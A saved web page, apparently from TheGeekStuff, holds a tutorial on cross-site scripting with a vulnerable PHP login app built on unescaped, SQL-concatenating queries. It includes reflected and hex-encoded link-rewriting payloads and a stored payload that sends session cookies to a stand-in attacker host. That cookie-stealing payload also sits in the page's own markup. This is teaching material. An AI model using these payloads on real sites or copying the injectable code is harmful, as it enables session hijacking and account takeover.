@@ -1,0 +1,674 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>XSS Attack Examples (Cross-Site Scripting Attacks)</title>
+<meta name="robots" content="noodp, noydir">
+<link rel="stylesheet" href="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/layout.css" type="text/css" media="screen, projection">
+<!--[if lte IE 8]><link rel="stylesheet" href="http://static.thegeekstuff.com/wp-content/themes/thesis_185/lib/css/ie.css" type="text/css" media="screen, projection" /><![endif]-->
+<link rel="stylesheet" href="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/custom.css" type="text/css" media="screen, projection">
+<link rel="canonical" href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/">
+<link rel="alternate" type="application/rss+xml" title="The Geek Stuff RSS Feed" href="http://feedproxy.google.com/TheGeekStuff">
+<link rel="pingback" href="http://www.thegeekstuff.com/xmlrpc.php">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.thegeekstuff.com/xmlrpc.php?rsd">
+<link href="http://static.thegeekstuff.com/favicon.ico" rel="icon" type="image/x-icon">
+<link rel="author" href="https://plus.google.com/112493711428194838421/posts">
+<link rel="alternate" type="application/rss+xml" title="The Geek Stuff » XSS Attack Examples (Cross-Site Scripting Attacks) Comments Feed" href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/feed/">
+
+<!-- All in One SEO Pack 2.1 by Michael Torbert of Semper Fi Web Design[277,334] -->
+<meta name="description" content="In the previous article of this series, we explained how to prevent from SQL-Injection attacks. In this article we will see a different kind of attack called">
+
+<link rel="canonical" href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/">
+<!-- /all in one seo pack -->
+<script src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/ga.js" async="" type="text/javascript"></script><script async="" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/cbgapi.loaded_1"></script><script async="" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/cbgapi.loaded_0"></script><script src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/a_002" type="text/javascript"></script><link rel="stylesheet" href="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/inputtools.css" type="text/css"><script src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/inputtools.js" type="text/javascript"></script><script>try {  for(var lastpass_iter=0; lastpass_iter < document.forms.length; lastpass_iter++){    var lastpass_f = document.forms[lastpass_iter];    if(typeof(lastpass_f.lpsubmitorig)=="undefined"){      if (typeof(lastpass_f.submit) == "function") {        lastpass_f.lpsubmitorig = lastpass_f.submit;        lastpass_f.submit = function(){          var form = this;          try {            if (document.documentElement && 'createEvent' in document)            {              var forms = document.getElementsByTagName('form');              for (var i=0 ; i<forms.length ; ++i)                if (forms[i]==form)                {                  var element = document.createElement('lpformsubmitdataelement');                  element.setAttribute('formnum',i);                  element.setAttribute('from','submithook');                  document.documentElement.appendChild(element);                  var evt = document.createEvent('Events');                  evt.initEvent('lpformsubmit',true,false);                  element.dispatchEvent(evt);                  break;                }            }          } catch (e) {}          try {            form.lpsubmitorig();          } catch (e) {}        }      }    }  }} catch (e) {}</script><link type="text/css" rel="stylesheet" href="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/css.css"></head>
+<body data-twttr-rendered="true" class="custom">
+<div id="dic_bubble" class="selection_bubble fontSize13 noSelect" style="z-index: 9999; border: 1px solid rgb(74, 174, 222); visibility: hidden; top: 4442px; left: 358px; background-color: rgb(255, 255, 255); color: rgb(0, 0, 0); font-size: 10pt; font-family: Helvetica;"><div class="selection_bubble_content"><div class="selection_bubble_word" id="selection_bubble_word">		<img src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/closeIcon.png" id="selection_bubble_close" align="right"><span style="font-weight:bold;padding-right:10px;">location</span><span style="padding-right:5px;font-size:12px;"><img style="position: relative;top: 4px;display:inline;cursor:pointer;" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/Audioicon.png" id="playSound"></span><span class="selection_bubble_align_with_spearker">[<span style="padding-right:2px;"> loh-<span class="dbus_pron_b">key</span>-sh<span class="dbus_pron_i">uh</span>n</span>]</span><span id="soundBox">&nbsp;</span></div><div id="dic_bubble_difinition">		<i class="selection_bubble_title">noun</i>		<div id="dic_bubble_dif" class="dic_dif"><div class="item"><div class="itemCount">1.</div><div class="itemData"> a place of settlement, activity, or residence: <span class="dbus_example">This town is a good location for a young doctor.</span></div></div></div></div> <div id="dic_bubble_synonyms"> <div class="selection_bubble_synonyms">synonyms</div> <div id="selection_bubble_defintion"><span><a rollapp-href="http://www.thegeekstuff.com/browse/area" href="http://www.thegeekstuff.com/browse/area">area</a>, <a rollapp-href="http://www.thegeekstuff.com/browse/hole" href="http://www.thegeekstuff.com/browse/hole">hole</a>, <a rollapp-href="http://www.thegeekstuff.com/browse/neighborhood" href="http://www.thegeekstuff.com/browse/neighborhood">neighborhood</a>, <a rollapp-href="http://www.thegeekstuff.com/browse/part" href="http://www.thegeekstuff.com/browse/part">part</a>, <a rollapp-href="http://www.thegeekstuff.com/browse/point" href="http://www.thegeekstuff.com/browse/point">point</a>, <a rollapp-href="http://www.thegeekstuff.com/browse/position" href="http://www.thegeekstuff.com/browse/position">position</a>, <a rollapp-href="http://www.thegeekstuff.com/browse/post" href="http://www.thegeekstuff.com/browse/post">post</a>, <a rollapp-href="http://www.thegeekstuff.com/browse/region" href="http://www.thegeekstuff.com/browse/region">region</a>, <a rollapp-href="http://www.thegeekstuff.com/browse/scene" href="http://www.thegeekstuff.com/browse/scene">scene</a>, <a rollapp-href="http://www.thegeekstuff.com/browse/section" href="http://www.thegeekstuff.com/browse/section">section</a></span></div></div><div id="selection_bubble_more_action">		<span>			<a rollapp-href="http://app.dictionary.com/click/hbnm17?clkdest=http://dictionary.reference.com/browse/%3Ca%20href=#%20onclick=\" href="http://app.dictionary.com/click/hbnm17?clkdest=http://dictionary.reference.com/browse/%3Ca%20href=#%20onclick=%5C" document.location="\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\&quot;">My Name</a>" target="_blank"&gt;				<img src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/more.png" alt="Dictionary More">					</span>		<a rollapp-href="http://app.dictionary.com/click/rovvlr?clkdest=http://dictionary.reference.com/" href="http://app.dictionary.com/click/rovvlr?clkdest=http://dictionary.reference.com/" target="_blank">			<img style="position: relative;bottom: 5px;" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/pop-up_logo.png" alt="Dictionary.com" align="right">		</a> </div></div><div class="dic-arrow-below" style="null"></div><div class="dic-bubble-arrow-below" style="border-bottom:20px solid #ffffff; null"></div></div><div id="container">
+<div id="page">
+	<div id="header">
+<p id="logo"><a rollapp-href="http://www.thegeekstuff.com/" href="http://www.thegeekstuff.com/"><img src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/thegeekstuff.gif" alt="The Geek Stuff"></a></p><div id="header_ad"><div id="header_ad1">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-8090601437064582";
+/* TGS Logo Header Big Image Only */
+google_ad_slot = "4708993701";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/show_ads.js">
+</script><ins style="display:inline-table;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent"><ins id="aswift_0_anchor" style="display:block;border:none;height:90px;margin:0;padding:0;position:relative;visibility:visible;width:728px;background-color:transparent"><iframe marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;" frameborder="0" height="90" scrolling="no" width="728"></iframe></ins></ins>
+</div></div>
+	</div>
+<ul class="menu">
+<li class="tab tab-home"><a rollapp-href="http://www.thegeekstuff.com/" href="http://www.thegeekstuff.com/">Home</a></li>
+<li class="tab tab-1"><a rollapp-href="http://www.thegeekstuff.com/linux-101-hacks-ebook/" href="http://www.thegeekstuff.com/linux-101-hacks-ebook/" title="Linux 101 Hacks eBook, by Ramesh Natarajan">Free eBook</a></li>
+<li class="tab tab-2"><a rollapp-href="http://www.thegeekstuff.com/contact/" href="http://www.thegeekstuff.com/contact/" title="Contact">Contact</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/about/" href="http://www.thegeekstuff.com/about/">About</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/best-of-the-blog" href="http://www.thegeekstuff.com/best-of-the-blog">Start Here</a></li>
+</ul>
+	<div id="content_box">
+		<div id="content" class="hfeed">
+
+			<div class="post-9629 post type-post status-publish format-standard hentry category-linux post_box top" id="post-9629">
+				<div class="headline_area">
+					<h1 class="entry-title">XSS Attack Examples (Cross-Site Scripting Attacks)</h1>
+					<p class="headline_meta">by <span class="author vcard"><span class="fn">Lakshmanan Ganapathy</span></span> on <abbr class="published" title="2012-02-16">February 16, 2012</abbr></p>
+				</div>
+				<div class="format_text entry-content">
+<div style="margin:7px 0px 6px 0px; padding:5px;"> 
+
+<div style="float:left; width=95px">
+<div id="___plusone_0" style="text-indent: 0px; margin: 0px; padding: 0px; background: none repeat scroll 0% 0% transparent; border-style: none; float: none; line-height: normal; font-size: 1px; vertical-align: baseline; display: inline-block; width: 90px; height: 20px;"><iframe title="+1" data-gapiattached="true" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/fastbutton.htm" name="I0_1399448585209" id="I0_1399448585209" vspace="0" tabindex="0" style="position: static; top: 0px; width: 90px; margin: 0px; border-style: none; left: 0px; visibility: visible; height: 20px;" marginwidth="0" marginheight="0" hspace="0" frameborder="0" scrolling="no" width="100%"></iframe></div>
+</div>
+
+<div style="float:left; padding:2px; width:90px"><iframe src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/like_002.htm" style="border:none; overflow:hidden; width:450px; height:21px;" allowtransparency="true" frameborder="0" scrolling="no"></iframe>
+</div>
+
+<div style="width=95px">
+<iframe style="width: 109px; height: 20px;" data-twttr-rendered="true" title="Twitter Tweet Button" class="twitter-share-button twitter-tweet-button twitter-share-button twitter-count-horizontal" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/tweet_button.htm" allowtransparency="true" id="twitter-widget-0" frameborder="0" scrolling="no"></iframe><script type="text/javascript" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/widgets.js"></script>
+</div>
+
+</div>
+<p>In the previous article of this series, we explained how to prevent from <a rollapp-href="http://www.thegeekstuff.com/2012/02/sql-injection-attacks/" href="http://www.thegeekstuff.com/2012/02/sql-injection-attacks/">SQL-Injection attacks</a>. In this article we will see a different kind of attack called XXS attacks.</p>
+<p>XSS stands for Cross Site Scripting.</p>
+<p>XSS is very similar to SQL-Injection. In SQL-Injection we exploited 
+the vulnerability by injecting SQL Queries as user inputs. In XSS, we 
+inject code (basically client side scripting) to the remote server.<br>
+<span id="more-9629"></span></p>
+<h3>Types of Cross Site Scripting</h3>
+<p>XSS attacks are broadly classified into 2 types:</p>
+<ol>
+<li>Non-Persistent</li>
+<li>Persistent</li>
+</ol>
+<h3>1. Non-Persistent XSS Attack</h3>
+<p>In case of Non-Persistent attack, it requires a user to visit the 
+specially crafted link by the attacker. When the user visit the link, 
+the crafted code will get executed by the user’s browser. Let us 
+understand this attack better with an example.</p>
+<h3>Example for Non-Persistent XSS</h3>
+<p>index.php:</p>
+<pre>&lt;?php
+$name = $_GET['name'];
+echo "Welcome $name&lt;br&gt;";
+echo "&lt;a href="http://xssattackexamples.com/"&gt;Click to Download&lt;/a&gt;";
+?&gt;</pre>
+<h4>Example 1:</h4>
+<p>Now the attacker will craft an URL as follows and send it to the victim:</p>
+    <center>
+      <div style="margin-left:2px; margin-top:10px; margin-bottom:10px; ">
+
+        <!-- AD BLOCK -->
+		
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-8090601437064582";
+/* TGS SinglePost Bottom Medium Rect */
+google_ad_slot = "8643685131";
+google_ad_width = 300;
+google_ad_height = 250;
+//-->
+</script>
+<script type="text/javascript" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/show_ads.js">
+</script><ins style="display:inline-table;border:none;height:250px;margin:0;padding:0;position:relative;visibility:visible;width:300px;background-color:transparent"><ins id="aswift_1_anchor" style="display:block;border:none;height:250px;margin:0;padding:0;position:relative;visibility:visible;width:300px;background-color:transparent"><iframe marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_1" name="aswift_1" style="left:0;position:absolute;top:0;" frameborder="0" height="250" scrolling="no" width="300"></iframe></ins></ins>
+
+        <!-- END AD BLOCK -->
+
+	  </div>
+    </center>
+
+
+<pre>index.php?name=guest&lt;script&gt;alert('attacked')&lt;/script&gt;</pre>
+<p>When the victim load the above URL into the browser, he will see an 
+alert box which says ‘attacked’. Even though this example doesn’t do any
+ damage, other than the annoying ‘attacked’ pop-up, you can see how an 
+attacker can use this method to do several damaging things.</p>
+<h4>Example 2:</h4>
+<p>For example, the attacker can now try to change the “Target URL” of 
+the link “Click to Download”. Instead of the link going to 
+“xssattackexamples.com” website, he can redirect it to go 
+“not-real-xssattackexamples.com” by crafting the URL as shown below:</p>
+<pre>index.php?name=&lt;script&gt;window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";}&lt;/script&gt;</pre>
+<p>In the above, we called the function to execute on “window.onload”. 
+Because the website (i.e index.php) first echos the given name and then 
+only it draws the &lt;a&gt; tag. So if we write directly like the one 
+shown below, it will not work, because those statements will get 
+executed before the &lt;a&gt; tag is echoed</p>
+<pre>index.php?name=&lt;script&gt;var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com"&lt;/script&gt;</pre>
+<p>Normally an attacker tends not to craft the URL which a human can 
+directly read. So he will encode the ASCII characters to hex as follows.</p>
+<pre>index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e</pre>
+<p>which is same as:</p>
+<pre>index.php?name=&lt;script&gt;window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://not-real-xssattackexamples.com/";}&lt;/script&gt;</pre>
+<p>Now the victim may not know what it is, because directly he cannot 
+understand that the URL is crafted and their is a more chance that he 
+can visit the URL.</p>
+<h3>2. Persistent XSS Attack</h3>
+<p>In case of persistent attack, the code injected by the attacker will 
+be stored in a secondary storage device (mostly on a database). The 
+damage caused by Persistent attack is more than the non-persistent 
+attack. Here we will see how to hijack other user’s session by 
+performing XSS.</p>
+<h3>Session</h3>
+<p>HTTP protocol is a stateless protocol, which means, it won’t maintain
+ any state with regard to the request and response. All request and 
+response are independent of each other. But most of the web application 
+don’t need this. Once the user has authenticated himself, the web server
+ should not ask the username/password for the next request from the 
+user. To do this, they need to maintain some kind of states between the 
+web-browser and web-server which is done through the “Sessions”.</p>
+<p>When the user login for the first time, a session ID will be created 
+by the web server and it will be sent to the web-browser as “cookie”. 
+All the sub-sequent request to the web server, will be based on the 
+“session id” in the cookie.</p>
+<h3>Examples for Persistent XSS Attack</h3>
+<p>This sample web application we’ve given below that demonstrates the persistent XSS attack does the following:</p>
+<ul>
+<li>There are two types of users: “Admin” and “Normal” user.</li>
+<li>When “Admin” log-in, he can see the list of usernames. When “Normal” users log-in, they can only update their display name.</li>
+</ul>
+<p>login.php:</p>
+<pre>&lt;?php
+$Host= '192.168.1.8';
+$Dbname= 'app';
+$User= 'yyy';
+$Password= 'xxx';
+$Schema = 'test';
+
+$Conection_string="host=$Host dbname=$Dbname user=$User password=$Password";
+
+/* Connect with database asking for a new connection*/
+$Connect=pg_connect($Conection_string,$PGSQL_CONNECT_FORCE_NEW);
+
+/* Error checking the connection string */
+if (!$Connect) {
+ echo "Database Connection Failure";
+ exit;
+}
+
+$query="SELECT user_name,password from $Schema.members where user_name='".$_POST['user_name']."';";
+
+$result=pg_query($Connect,$query);
+$row=pg_fetch_array($result,NULL,PGSQL_ASSOC);
+
+$user_pass = md5($_POST['pass_word']);
+$user_name = $row['user_name'];
+
+if(strcmp($user_pass,$row['password'])!=0) {
+ echo "Login failed";
+}
+else {
+ # Start the session
+ session_start();
+ $_SESSION['USER_NAME'] = $user_name;
+ echo "&lt;head&gt; &lt;meta http-equiv=\"Refresh\" content=\"0;url=home.php\" &gt; &lt;/head&gt;";
+}
+?&gt;</pre>
+<p>home.php:</p>
+<pre>&lt;?php
+session_start();
+if(!$_SESSION['USER_NAME']) {
+ echo "Need to login";
+}
+else {
+ $Host= '192.168.1.8';
+ $Dbname= 'app';
+ $User= 'yyy';
+ $Password= 'xxx';
+ $Schema = 'test';
+ $Conection_string="host=$Host dbname=$Dbname user=$User password=$Password";
+ $Connect=pg_connect($Conection_string,$PGSQL_CONNECT_FORCE_NEW);
+ if($_SERVER['REQUEST_METHOD'] == "POST") {
+  $query="update $Schema.members set display_name='".$_POST['disp_name']."' where user_name='".$_SESSION['USER_NAME']."';";
+  pg_query($Connect,$query);
+  echo "Update Success";
+ }
+ else {
+  if(strcmp($_SESSION['USER_NAME'],'admin')==0) {
+   echo "Welcome admin&lt;br&gt;&lt;hr&gt;";
+   echo "List of user's are&lt;br&gt;";
+   $query = "select display_name from $Schema.members where user_name!='admin'";
+   $res = pg_query($Connect,$query);
+   while($row=pg_fetch_array($res,NULL,PGSQL_ASSOC)) {
+    echo "$row[display_name]&lt;br&gt;";
+   }
+ }
+ else {
+  echo "&lt;form name=\"tgs\" id=\"tgs\" method=\"post\" action=\"home.php\"&gt;";
+&nbsp;&nbsp;echo "Update display name:&lt;input type=\"text\" id=\"disp_name\" name=\"disp_name\" value=\"\"&gt;";
+&nbsp;&nbsp;echo "&lt;input type=\"submit\" value=\"Update\"&gt;";
+ }
+}
+}
+?&gt;</pre>
+<p>Now the attacker log-in as a normal user, and he will enter the following in the textbox as his display name:</p>
+<pre>&lt;a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape\(document.cookie\)\;\"&gt;My Name&lt;/a&gt;</pre>
+<p>The above information entered by the attacker will be stored in the database (persistent).</p>
+<p>Now, when the admin log-in to the system, he will see a link named 
+“My Name” along with other usernames. When admin clicks the link, it 
+will send the cookie which has the session ID, to the attacker’s site. 
+Now the attacker can post a request by using that session ID to the web 
+server, and he can act like “Admin” until the session is expired. The 
+cookie information will be something like the following:</p>
+<pre>xss.php?c=PHPSESSID%3Dvmcsjsgear6gsogpu7o2imr9f3
+</pre>
+<p>Once the hacker knows the PHPSESSID, he can use this session to get the admin privilege until PHPSESSID expires.</p>
+<p>To understand this more, we can use a firefox addon called “Tamper 
+Data”, which can be used to add a new HTTP header called “Cookies” and 
+set the value to “PHPSESSID=vmcsjsgear6gsogpu7o2imr9f3″.</p>
+<p>We’ll cover how to use “Tamper Data” in future article of this series.</p>
+<div style="margin:7px 0px 3px 0px; padding:5px; background:#F2F0E8">
+
+<div style="float:left; width=95px">
+<div id="___plusone_1" style="text-indent: 0px; margin: 0px; padding: 0px; background: none repeat scroll 0% 0% transparent; border-style: none; float: none; line-height: normal; font-size: 1px; vertical-align: baseline; display: inline-block; width: 90px; height: 20px;"><iframe title="+1" data-gapiattached="true" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/fastbutton_002.htm" name="I1_1399448585215" id="I1_1399448585215" vspace="0" tabindex="0" style="position: static; top: 0px; width: 90px; margin: 0px; border-style: none; left: 0px; visibility: visible; height: 20px;" marginwidth="0" marginheight="0" hspace="0" frameborder="0" scrolling="no" width="100%"></iframe></div>
+</div>
+
+<div style="float:left; width=95px">
+<iframe style="width: 109px; height: 20px;" data-twttr-rendered="true" title="Twitter Tweet Button" class="twitter-share-button twitter-tweet-button twitter-share-button twitter-count-horizontal" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/tweet_button_002.htm" allowtransparency="true" id="twitter-widget-1" frameborder="0" scrolling="no"></iframe><script type="text/javascript" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/widgets.js"></script>
+</div>
+
+<div style="float:left; padding:2px; width:90px"><iframe src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/like_002.htm" style="border:none; overflow:hidden; width:450px; height:21px;" allowtransparency="true" frameborder="0" scrolling="no"></iframe>
+</div>
+
+<div style="padding:1px">
+&gt;&nbsp;<a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#respond" href="#respond">Add your comment</a> 
+</div>
+
+</div>
+<br>
+<div id="subscribebox">
+<a rollapp-href="http://www.thegeekstuff.com/linux-sysadmin" rel="nofollow" href="http://www.thegeekstuff.com/linux-sysadmin"><img class="alignright" title="Linux Sysadmin Course" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/linux-sysadmin-200-166.png" alt="Linux Sysadmin Course"></a>
+Linux provides several powerful administrative tools and utilities which
+ will help you to manage your systems effectively. If you don’t know 
+what these tools are and how to use them, you could be spending lot of 
+time trying to perform even the basic administrative tasks. The focus of
+ this course is to help you understand system administration tools, 
+which will help you to become an effective Linux system administrator.<br> Get the <a rollapp-href="http://www.thegeekstuff.com/linux-sysadmin" href="http://www.thegeekstuff.com/linux-sysadmin" class="button">Linux Sysadmin Course</a> Now!
+</div>
+<h3>If you enjoyed this article, you might also like..</h3>
+<table>
+<tbody><tr>
+<td valign="top">
+<ol>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/12/50-unix-linux-sysadmin-tutorials/" href="http://www.thegeekstuff.com/2010/12/50-unix-linux-sysadmin-tutorials/">50 Linux Sysadmin Tutorials</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/11/50-linux-commands/" href="http://www.thegeekstuff.com/2010/11/50-linux-commands/">50 Most Frequently Used Linux Commands (With Examples)</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2011/12/linux-performance-monitoring-tools/" href="http://www.thegeekstuff.com/2011/12/linux-performance-monitoring-tools/">Top 25 Best Linux Performance Monitoring and Debugging Tools</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/03/15-practical-linux-find-command-examples/" href="http://www.thegeekstuff.com/2009/03/15-practical-linux-find-command-examples/">Mommy, I found it! – 15 Practical Linux Find Command Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/linux-101-hacks-ebook/" href="http://www.thegeekstuff.com/linux-101-hacks-ebook/">Linux 101 Hacks 2nd Edition eBook</a>&nbsp;<img title="Linux 101 Hacks Book" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/free-small.png" alt="Linux 101 Hacks Book"></li>
+</ol>
+</td>
+<td>
+<ul>
+<li><a rollapp-href="http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples/" href="http://www.thegeekstuff.com/2010/01/awk-introduction-tutorial-7-awk-print-examples/">Awk Introduction – 7 Awk Print Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/10/unix-sed-tutorial-advanced-sed-substitution-examples/" href="http://www.thegeekstuff.com/2009/10/unix-sed-tutorial-advanced-sed-substitution-examples/">Advanced Sed Substitution Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2009/03/8-essential-vim-editor-navigation-fundamentals/" href="http://www.thegeekstuff.com/2009/03/8-essential-vim-editor-navigation-fundamentals/">8 Essential Vim Editor Navigation Fundamentals</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2011/06/iptables-rules-examples/" href="http://www.thegeekstuff.com/2011/06/iptables-rules-examples/">25 Most Frequently Used Linux IPTables Rules Examples</a></li>
+<li><a rollapp-href="http://www.thegeekstuff.com/2008/08/turbocharge-putty-with-12-powerful-add-ons-software-for-geeks-3/" href="http://www.thegeekstuff.com/2008/08/turbocharge-putty-with-12-powerful-add-ons-software-for-geeks-3/">Turbocharge PuTTY with 12 Powerful Add-Ons</a></li>
+</ul>
+</td>
+</tr>
+</tbody></table>
+<br>
+<center> 
+<table cellspacing="10" border="0"> 
+<tbody><tr> 
+<td> 
+<a rollapp-href="http://www.thegeekstuff.com/bash-101-hacks-ebook/" rel="nofollow" href="http://www.thegeekstuff.com/bash-101-hacks-ebook/"><img title="Bash 101 Hacks Book" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/bash-132.png" alt="Bash 101 Hacks Book"></a> 
+</td> 
+<td> 
+<a rollapp-href="http://www.thegeekstuff.com/sed-awk-101-hacks-ebook/" rel="nofollow" href="http://www.thegeekstuff.com/sed-awk-101-hacks-ebook/"><img title="Sed and Awk 101 Hacks Book" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/sed-and-awk-132.png" alt="Sed and Awk 101 Hacks Book"></a> 
+</td> 
+<td> 
+<a rollapp-href="http://www.thegeekstuff.com/nagios-core-ebook/" rel="nofollow" href="http://www.thegeekstuff.com/nagios-core-ebook/"><img title="Nagios Core 3 Book" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/nagios-core-132.png" alt="Nagios Core 3 Book"></a> 
+</td> 
+<td> 
+<a rollapp-href="http://www.thegeekstuff.com/vim-101-hacks-ebook/" rel="nofollow" href="http://www.thegeekstuff.com/vim-101-hacks-ebook/"><img title="Vim 101 Hacks Book" src="XSS%20Attack%20Examples%20%28Cross-Site%20Scripting%20Attacks%29_dosyalar/vim-101-hacks-132.png" alt="Vim 101 Hacks Book"></a> 
+</td> 
+</tr> 
+</tbody></table> 
+</center>
+<br>
+<div id="tgs-tags">
+</div>
+				</div>
+			</div>
+
+			<div id="comments">
+				<div id="comments_intro" class="comments_intro">
+					<p><span class="bracket">{</span> <span>9</span> comments… read them below or <a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#respond" href="#respond" rel="nofollow">add one</a> <span class="bracket">}</span></p>
+				</div>
+
+				<dl id="comment_list">
+					<dt class="comment even thread-even depth-1" id="comment-199046">
+<span class="avatar"><a rollapp-href="http://whatthefrog.co.uk/" href="http://whatthefrog.co.uk/" rel="nofollow"></a></span>
+<span class="comment_num"><a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#comment-199046" href="#comment-199046" title="Permalink to this comment" rel="nofollow">1</a></span>
+<span class="comment_author"><a rollapp-href="http://whatthefrog.co.uk/" href="http://whatthefrog.co.uk/" rel="external nofollow" class="url">Julien</a></span>
+<span class="comment_time">February 16, 2012 at 10:45 am</span>
+
+					</dt>
+					<dd class="comment even thread-even depth-1">
+<div class="format_text" id="comment-body-199046">
+<p>Nice article ! covers the basics of XSS, but you forgot to keep hope 
+in you pandora box, just letting people know how to protect themselves 
+from such attacks (SQL Injection, XSS, …): the correct way is always the
+ same ESCAPE</p>
+<p>for XSS in php this is as simple as using htmlspecialchars()<br>
+<a rollapp-href="http://php.net/manual/en/function.htmlspecialchars.php" href="http://php.net/manual/en/function.htmlspecialchars.php" rel="nofollow">http://php.net/manual/en/function.htmlspecialchars.php</a></p>
+<p>   while($row=pg_fetch_array($res,NULL,PGSQL_ASSOC)) {<br>
+    echo htmlspecialchars($row[display_name]) . “”;<br>
+   }</p>
+<p>Keep posting good stuffs</p>
+</div>
+					</dd>
+					<dt class="comment odd alt thread-odd thread-alt depth-1" id="comment-199172">
+<span class="avatar"></span>
+<span class="comment_num"><a rollapp-href="http://www.thegeekstuff.com/2012/02/xss-attack-examples/#comment-199172" href="#comment-199172" title="Permalink to this comment" rel="nofollow">2</a></span>
+<span class="comment_author">niraj</span>
+<span class="comment_time">February 16, 2012 at 10:44 pm</span>
+
+					</dt>
